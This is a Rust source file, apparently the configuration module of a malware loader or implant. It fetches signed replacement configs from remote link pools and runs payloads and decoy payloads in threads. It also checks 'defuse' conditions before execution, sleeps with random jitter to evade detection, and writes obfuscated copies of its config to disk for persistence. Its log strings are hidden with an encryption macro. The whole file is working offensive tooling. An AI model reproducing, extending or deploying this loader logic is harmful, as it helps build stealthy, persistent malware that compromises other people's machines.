use crate::dataoperation::apply_all_dataoperations;
use crate::defuse::{Defuse, Operator};
use crate::link::FileLink;
use crate::link::Link;
use crate::payload::Payload;
use crate::payload::PayloadExecThread;
use crate::payload_util::create_directory;
use crate::poollink::PoolLinks;
use crate::poollink::PoolMode;
use crate::rundata::RunData;
use crate::utils::calculate_path;
use crate::utils::calculate_path_reverse;

use chksum_sha2_512 as sha2_512;
use chrono::prelude::*;
use rand::Rng;
use ring::signature::Ed25519KeyPair;
use ring::signature::{self, KeyPair};
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::format;
use std::fs;
use std::{thread, time};

use cryptify::encrypt_string;
use log::debug;
use log::info;
use log::warn;

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct VerifSignMaterial {
    pub peer_public_key_bytes: Vec<u8>,
    pub sign_bytes: Vec<u8>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Config {
    pub update_links: BTreeMap<u64, (String, PoolLinks)>,
    pub backup_config: Vec<FileLink>,
    pub payloads: Vec<Payload>,
    pub defuse_update: Vec<Defuse>,
    pub defuse_payload: Vec<Defuse>,

    pub decoy_defuse_update_success: bool,
    pub decoy_defuse_payload_success: bool,
    pub decoy_update_config: Vec<Payload>,
    pub decoy_payload_exec: Vec<Payload>,
    pub decoy_before_payload: bool, // on verra

    pub sign_material: VerifSignMaterial,
    pub sleep: u64,
    pub jitt: u64,
    pub link_timeout: u64,
    pub link_user_agent: String,
    pub loader_keypair: Vec<u8>,
    pub date: DateTime<Utc>,
}

//#[allow(dead_code)]
impl Config {
    pub fn new_unsigned(
        update_links: BTreeMap<u64, (String, PoolLinks)>,
        backup_config: Vec<FileLink>,
        payloads: Vec<Payload>,
        defuse_update: Vec<Defuse>,
        defuse_payload: Vec<Defuse>,

        decoy_defuse_update_success: bool,
        decoy_defuse_payload_success: bool,
        decoy_update_config: Vec<Payload>,
        decoy_payload_exec: Vec<Payload>,
        decoy_before_payload: bool, // on verra

        sleep: u64,
        jitt: u64,
        link_timeout: u64,
        link_user_agent: String,
        loader_keypair: Vec<u8>,
    ) -> Config {
        let sign_material = VerifSignMaterial {
            peer_public_key_bytes: vec![],
            sign_bytes: vec![],
        };
        Config {
            update_links: update_links,
            backup_config: backup_config,
            sign_material: sign_material,
            payloads: payloads,
            defuse_update: defuse_update,
            defuse_payload: defuse_payload,

            decoy_defuse_update_success: decoy_defuse_update_success,
            decoy_defuse_payload_success: decoy_defuse_payload_success,
            decoy_update_config: decoy_update_config,
            decoy_payload_exec: decoy_payload_exec,
            decoy_before_payload: decoy_before_payload, // on verra

            sleep: sleep,
            jitt: jitt,
            link_timeout: link_timeout,
            link_user_agent: link_user_agent,
            loader_keypair: loader_keypair,
            date: Utc::now(),
        }
    }
    pub fn new_signed(
        key_pair: &Ed25519KeyPair,
        update_links: BTreeMap<u64, (String, PoolLinks)>,
        backup_config: Vec<FileLink>,
        payloads: Vec<Payload>,
        defuse_update: Vec<Defuse>,
        defuse_payload: Vec<Defuse>,

        decoy_defuse_update_success: bool,
        decoy_defuse_payload_success: bool,
        decoy_update_config: Vec<Payload>,
        decoy_payload_exec: Vec<Payload>,
        decoy_before_payload: bool, // on verra

        sleep: u64,
        jitt: u64,
        link_timeout: u64,
        link_user_agent: String,
        loader_keypair: Vec<u8>,
    ) -> Config {
        let mut new_loader = Config::new_unsigned(
            update_links,
            backup_config,
            payloads,
            defuse_update,
            defuse_payload,
            decoy_defuse_update_success,
            decoy_defuse_payload_success,
            decoy_update_config,
            decoy_payload_exec,
            decoy_before_payload, // on verra
            sleep,
            jitt,
            link_timeout,
            link_user_agent,
            loader_keypair,
        );
        let peer_public_key_bytes = key_pair.public_key().as_ref().to_vec();
        new_loader.sign_material.peer_public_key_bytes = peer_public_key_bytes;
        new_loader.sign_loader(key_pair);
        new_loader
    }

    pub fn return_sign_data(&self) -> String {
        let copy_loaderconf = &mut self.clone();
        copy_loaderconf.sign_material.sign_bytes = vec![];
        format!("sign_data: {:?}", copy_loaderconf)
    }

    pub fn sign_loader(&mut self, key_pair: &Ed25519KeyPair) {
        let peer_public_key_bytes = key_pair.public_key().as_ref().to_vec();
        let sign_data = self.return_sign_data();
        let sig: signature::Signature = key_pair.sign(sign_data.as_bytes());
        let sign_bytes = sig.as_ref();
        let sign_material = VerifSignMaterial {
            peer_public_key_bytes: peer_public_key_bytes,
            sign_bytes: sign_bytes.to_vec(),
        };
        self.sign_material = sign_material;
    }

    pub fn verify_newconfig_signature(
        &self,
        newconfig: &Config,
    ) -> Result<(), ring::error::Unspecified> {
        let sign_data = newconfig.return_sign_data();
        let peer_public_key = signature::UnparsedPublicKey::new(
            &signature::ED25519,
            &self.sign_material.peer_public_key_bytes,
        );
        peer_public_key.verify(sign_data.as_bytes(), &newconfig.sign_material.sign_bytes)
    }

    pub fn new_fromfile(path_file: &str) -> Config {
        let loader_bytes: Vec<u8> = fs::read(path_file).unwrap();
        let l = std::str::from_utf8(&loader_bytes).unwrap();
        let config: Config = serde_json::from_str(l).unwrap();
        config
    }

    pub fn print_loader(&self) {
        debug!("{:#?}", self);
    }
    pub fn print_loader_compact(&self) {
        debug!("{}", encrypt_string!("print_loader_compact"));
        debug!("{:?}", self);
    }
    pub fn serialize_to_file(&self, path_file: &str) {
        let serialized: String = self.concat_loader_jsondata();
        fs::write(path_file, &serialized).expect("Unable to write file");
    }
    pub fn serialize_to_file_pretty(&self, path_file: &str) {
        let serialized: String = serde_json::to_string_pretty(&self).unwrap();
        fs::write(path_file, &serialized).expect("Unable to write file");
    }
    pub fn concat_loader_jsondata(&self) -> String {
        serde_json::to_string(&self).unwrap()
    }
    pub fn print_loader_hash(&self) {
        debug!(
            "{}{}",
            encrypt_string!("hash: "),
            self.calculate_loader_hash()
        );
    }
    pub fn calculate_loader_hash(&self) -> String {
        let serialized = self.concat_loader_jsondata();
        let data = serialized;
        let digest = sha2_512::chksum(data).unwrap();
        digest.to_hex_lowercase()
    }
    pub fn is_same_loader_hash(&self, otherloader: &Config) -> bool {
        let loader_hash = self.calculate_loader_hash();
        let otherloader_hash = otherloader.calculate_loader_hash();
        loader_hash == otherloader_hash
    }
    pub fn is_same_loader(&self, otherloader: &Config) -> bool {
        let loader_serialized = self.concat_loader_jsondata();
        let otherloader_serialized = otherloader.concat_loader_jsondata();
        loader_serialized == otherloader_serialized
    }
    pub fn fromfile_master_keypair(path_file: &str) -> Ed25519KeyPair {
        let pkcs8_bytes: Vec<u8> = fs::read(path_file).unwrap();
        signature::Ed25519KeyPair::from_pkcs8(pkcs8_bytes.as_ref()).unwrap()
    }

    pub fn exec_payloads(&self, run_data: &mut RunData) {
        let mut nb_payload = 1;
        for payload in &self.payloads {
            info!(
                "{}/{}{}{:?}",
                nb_payload,
                &self.payloads.len(),
                encrypt_string!(" payload: "),
                &payload
            );

            //clean the running_thread
            run_data
                .running_thread_payload
                .retain(|x| x.0.is_finished() == false);

            if payload.is_already_running_or_runonce_payload(run_data) == false {
                match payload.exec_payload(&self) {
                    PayloadExecThread::NoThread() => (),
                    PayloadExecThread::Thread(join_handle, payload) => {
                        run_data.running_thread_payload.push((join_handle, payload));
                        ()
                    }
                }
            }

            // add runonce payload to the list
            if payload.is_runonce() {
                if !run_data.runonce_payload.contains(&payload) {
                    run_data.runonce_payload.push(payload.clone());
                }
            }

            nb_payload = nb_payload + 1;
        }

        //clean the running_thread
        run_data
            .running_thread_payload
            .retain(|x| x.0.is_finished() == false);
    }

    pub fn exec_decoy_update(&self, run_data: &mut RunData) {
        info!("{}", encrypt_string!("[+] DECOY UPDATE config"));
        let mut nb_payload = 1;
        for payload in &self.decoy_update_config {
            info!(
                "{}/{}{}{:?}",
                nb_payload,
                &self.decoy_update_config.len(),
                encrypt_string!(" decoy update payload: "),
                &payload
            );

            //clean the running_thread
            run_data
                .running_thread_decoy_update
                .retain(|x| x.0.is_finished() == false);

            if payload.is_already_running_or_runonce_decoy_update(run_data) == false {
                match payload.exec_payload(&self) {
                    PayloadExecThread::NoThread() => (),
                    PayloadExecThread::Thread(join_handle, payload) => {
                        run_data
                            .running_thread_decoy_update
                            .push((join_handle, payload));
                        ()
                    }
                }
            }

            // add runonce payload to the list
            if payload.is_runonce() {
                if !run_data.runonce_decoy_update.contains(&payload) {
                    run_data.runonce_decoy_update.push(payload.clone());
                }
            }

            nb_payload = nb_payload + 1;
        }

        //clean the running_thread
        run_data
            .running_thread_decoy_update
            .retain(|x| x.0.is_finished() == false);
    }

    pub fn exec_decoy_payload(&self, run_data: &mut RunData) {
        info!("{}", encrypt_string!("[+] DECOY PAYLOADS exec"));
        let mut nb_payload = 1;
        for payload in &self.decoy_payload_exec {
            info!(
                "{}/{}{}{:?}",
                nb_payload,
                &self.decoy_payload_exec.len(),
                encrypt_string!(" decoy exec payload: "),
                &payload
            );

            //clean the running_thread
            run_data
                .running_thread_decoy_payload
                .retain(|x| x.0.is_finished() == false);

            if payload.is_already_running_or_runonce_decoy_payload(run_data) == false {
                match payload.exec_payload(&self) {
                    PayloadExecThread::NoThread() => (),
                    PayloadExecThread::Thread(join_handle, payload) => {
                        run_data
                            .running_thread_decoy_payload
                            .push((join_handle, payload));
                        ()
                    }
                }
            }

            // add runonce payload to the list
            if payload.is_runonce() {
                if !run_data.runonce_decoy_payload.contains(&payload) {
                    run_data.runonce_decoy_payload.push(payload.clone());
                }
            }

            nb_payload = nb_payload + 1;
        }

        //clean the running_thread
        run_data
            .running_thread_decoy_payload
            .retain(|x| x.0.is_finished() == false);
    }

    pub fn stop_defuse(&self, defuse_list: &Vec<Defuse>) -> bool {
        let mut nb_defuse: i32 = 1;
        let mut check_this_defuse = true;
        for defuse in defuse_list {
            info!(
                "{}/{}{}{:?}",
                nb_defuse,
                defuse_list.len(),
                encrypt_string!(" defuse: "),
                defuse
            );
            if check_this_defuse {
                if defuse.stop_the_exec(&self) {
                    match defuse.get_operator() {
                        Operator::AND => return true,
                        Operator::OR => {}
                    }
                } else {
                    match defuse.get_operator() {
                        Operator::AND => {}
                        Operator::OR => check_this_defuse = false,
                    }
                }
            } else {
                match defuse.get_operator() {
                    Operator::AND => check_this_defuse = true,
                    Operator::OR => {}
                }
            }
            nb_defuse = nb_defuse + 1;
        }
        false
    }
    pub fn sleep_and_jitt(&self) {
        let mut rng: rand::prelude::ThreadRng = rand::thread_rng();
        let random_number: f64 = rng.gen();

        let jitt = (self.jitt as f64) * random_number;
        let total_sleep = (self.sleep as f64) + jitt;
        info!("{}{}", encrypt_string!("sleep: "), total_sleep);
        let sleep_time: time::Duration = time::Duration::from_millis((total_sleep * 1000.0) as u64);
        thread::sleep(sleep_time);
    }

    // try to fetch a new config, if no config are found return self. if no config is return from pool, need to try the next pool
    //pub fn update_config(&self, session_id: &String, running_thread: &Vec<Payload>) -> Config {
    pub fn update_config(&self, session_id: &String, run_data: &RunData) -> Config {
        let mut pool_nb: i32 = 0;
        for (_pool_nb, (pool_name, pool_links)) in &self.update_links {
            pool_nb = pool_nb + 1;
            info!(
                "{}/{}{}{}",
                pool_nb,
                &self.update_links.len(),
                encrypt_string!(" PoolLinks: "),
                &pool_name
            );
            if let Some(newconf) = self.handle_pool_update(pool_links, session_id, run_data, false)
            {
                return newconf;
            }
        }
        warn!(
            "{}",
            encrypt_string!("[+] All PoolLinks fetch without finding a new fresh VALID config")
        );
        info!(
            "{}",
            encrypt_string!("[+] DECISION: keep the same active CONFIG, and run the payloads")
        );
        self.to_owned()
    }

    pub fn backup_config(&self) {
        for backup_file in &self.backup_config {
            info!("{}{:?}", encrypt_string!("[+] backup_file: "), backup_file);
            self.backup_config_to_file(&mut backup_file.clone());
        }
    }

    // TODO reste a faire, il ne faut PAS backuper la config en clair, mais bien lui appliquer une suite de dataopération bien définie.
    // ensuite, il faudra appliquer une logique de chargement de cette config si existante et plus récente etc... au lancement du loader
    pub fn backup_config_to_file(&self, backup_file: &mut FileLink) {
        match calculate_path(&backup_file.file_path) {
            Ok(path) => {
                if let Err(e) = create_directory(&path) {
                    warn!(
                        "{}{:?} - {:?}",
                        encrypt_string!("[!] Failed to create directory for backup file: "),
                        path,
                        e
                    );
                }

                info!("{}{:?}", encrypt_string!("[+] Write file: "), path);

                let data: Vec<u8> = self.clone().concat_loader_jsondata().into_bytes();
                match apply_all_dataoperations(&mut backup_file.dataoperation, data) {
                    Ok(data) => {
                        if let Err(e) = fs::write(&path, &data) {
                            warn!(
                                "{}{:?} - {:?}",
                                encrypt_string!("[!] Failed to write backup file: "),
                                path,
                                e
                            );
                        }
                    }
                    Err(e) => {
                        warn!(
                            "{}{:?}",
                            encrypt_string!("[!] Failed to apply_all_dataoperations: "),
                            e
                        );
                    }
                }
            }
            Err(e) => {
                warn!(
                    "{}{} - {:?}",
                    encrypt_string!("[!] Failed to calculate backup path: "),
                    backup_file.file_path,
                    e
                );
            }
        }
    }

    pub fn restore_backup_config_from_file(
        &self,
        session_id: &String,
        run_data: &RunData,
    ) -> Config {
        //TODO
        let mut file_links = vec![];
        for backup_file in &self.backup_config {
            debug!("{}{:?}", encrypt_string!("[+] backup_file: "), backup_file);
            match calculate_path_reverse(&backup_file.file_path) {
                Ok(possible_paths) => {
                    if possible_paths.is_empty() {
                        warn!(
                            "{}{}",
                            encrypt_string!("[!] No matching path found for: "),
                            backup_file.file_path
                        );
                    } else {
                        debug!(
                            "{}{:?}",
                            encrypt_string!("[+] possible_path: "),
                            possible_paths
                        );
                    }

                    for path in possible_paths {
                        let file_path = match path.into_os_string().into_string() {
                            Ok(s) => s,
                            Err(os) => {
                                warn!(
                                    "{}{:?}",
                                    encrypt_string!("[!] Invalid non-UTF8 path, skipping: "),
                                    os
                                );
                                continue;
                            }
                        };

                        let fff: Link = Link::FILE(FileLink {
                            file_path,
                            dataoperation: backup_file.dataoperation.clone(),
                            jitt: 0,
                            sleep: 0,
                        });

                        file_links.push(fff);
                    }
                }
                Err(e) => {
                    warn!(
                        "{}{} - {:?}",
                        encrypt_string!("[!] Failed to reverse-calculate path for: "),
                        backup_file.file_path,
                        e
                    );
                }
            }
        }

        let pool_links = PoolLinks {
            pool_mode: PoolMode::SIMPLE,
            pool_links: file_links,
        };

        if let Some(newconf) = self.handle_pool_update(&pool_links, session_id, run_data, true) {
            return newconf;
        };
        info!(
            "{}",
            encrypt_string!("[+] DECISION: keep the same active CONFIG")
        );
        self.to_owned()
    }

    fn handle_pool_update(
        &self,
        pool_links: &PoolLinks,
        session_id: &String,
        run_data: &RunData,
        restore_config: bool,
    ) -> Option<Self> {
        match pool_links.update_pool(&self, session_id, run_data) {
            Ok(newconf) => {
                let run_payload: String = if restore_config {
                    "\n".to_string()
                } else {
                    format!("{}", encrypt_string!(", and run the payloads"))
                };

                if self.is_same_loader(&newconf) {
                    info!(
                        "{}",
                        encrypt_string!("[+] the new config is identical to the current config")
                    );
                    info!(
                        "{}{}",
                        encrypt_string!("[+] DECISION: keep the same active CONFIG"),
                        run_payload
                    );
                } else {
                    info!(
                        "{}",
                        encrypt_string!("the new config is different from the current config")
                    );
                    info!(
                        "{}{}",
                        encrypt_string!("[+] DECISION: replace the active CONFIG"),
                        run_payload
                    );
                    if !restore_config { 
                        newconf.backup_config();
                    }
                }

                Some(newconf)
            }
            Err(error) => {
                let problem: String = if restore_config {
                    format!(
                        "{}",
                        encrypt_string!("[+] Fail to restore config, reason: \n")
                    )
                } else {
                    format!(
                        "{}",
                        encrypt_string!("[+] Switch to next PoolLinks, reason: ")
                    )
                };
                warn!("{}{}", problem, error);
                None
            }
        }
    }
}
